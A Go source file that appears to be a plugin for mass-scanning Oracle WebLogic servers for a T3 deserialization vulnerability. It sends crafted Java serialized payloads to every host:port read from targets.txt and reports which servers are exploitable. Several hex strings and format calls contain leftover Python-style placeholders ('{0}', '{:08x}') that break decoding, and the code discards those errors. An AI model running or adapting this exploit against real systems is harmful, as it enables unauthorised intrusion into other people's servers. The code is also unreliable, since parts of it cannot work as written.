package Plugins

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"regexp"
	"strings"
	"time"
)

func t3handshake2628(conn net.Conn) {
	conn.Write([]byte{0x74, 0x33, 0x20, 0x31, 0x32, 0x2e, 0x32, 0x2e, 0x31, 0x0a, 0x41, 0x53, 0x3a, 0x32, 0x35, 0x35, 0x0a, 0x48, 0x4c, 0x3a, 0x31, 0x39, 0x0a, 0x4d, 0x53, 0x3a, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x0a, 0x0a})
	time.Sleep(1 * time.Second)
	conn.Read(make([]byte, 1024))
}

func buildT3RequestObject2628(conn net.Conn, rport int) {
	data1, _ := hex.DecodeString("000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07")
	data2, _ := hex.DecodeString(fmt.Sprintf("2e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00fffe010000%s", "{:08x}", PAYLOAD, "{:08x}"))
	data2 = []byte(fmt.Sprintf(string(data2), len(data2)))
	conn.Write(data1)
	time.Sleep(2 * time.Second)
	conn.Write(data2)
}

func sendEvilObjData2628(conn net.Conn, data string) string {
	payload := "056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c0200007870773702000078fe010000"
	payload += data
	payload += "aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff"
	payload = fmt.Sprintf("%08x%s", len(payload)/2+4, payload)
	conn.Write([]byte(payload))
	var res string
	count := 0
	for count < 10 {
		buf := make([]byte, 4096)
		n, _ := conn.Read(buf)
		res += string(buf[:n])
		time.Sleep(100 * time.Millisecond)
		count++
	}
	return res
}

func checkVul2628(res, rip string, rport int) (int, string) {
	r := regexp.MustCompile(VER_SIG3)
	if r.MatchString(res) {
		return 1, fmt.Sprintf("[+] 存在漏洞 %s ", VUL[5])
	}
	return 0, fmt.Sprintf("[-] 已扫描 %s ", VUL[5])
}

func run2628(rip string, rport int) (int, string) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", rip, rport), 5*time.Second)
	if err != nil {
		return 0, fmt.Sprintf("[-] [%s] connection failed", rip+":"+fmt.Sprint(rport))
	}
	defer conn.Close()
	t3handshake2628(conn)
	buildT3RequestObject2628(conn, rport)
	rs := sendEvilObjData2628(conn, PAYLOAD)
	return checkVul2628(rs, rip, rport)
}

func Check2628() {
	filePath := "targets.txt"

	file, err := os.Open(filePath)
	if err != nil {
		fmt.Printf("无法打开文件：%s\n", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			parts := strings.Split(line, ":")
			if len(parts) != 2 {
				fmt.Printf("无效的目标格式：%s\n", line)
				continue
			}

			targetHost := parts[0]
			targetPort := parts[1]

			// 将端口转换为整数
			var portInt int
			_, err := fmt.Sscanf(targetPort, "%d", &portInt)
			if err != nil {
				fmt.Printf("无效的端口：%s\n", targetPort)
				continue
			}
			_, result := run2628(targetHost, portInt)
			fmt.Println(result)

		}
	}
}
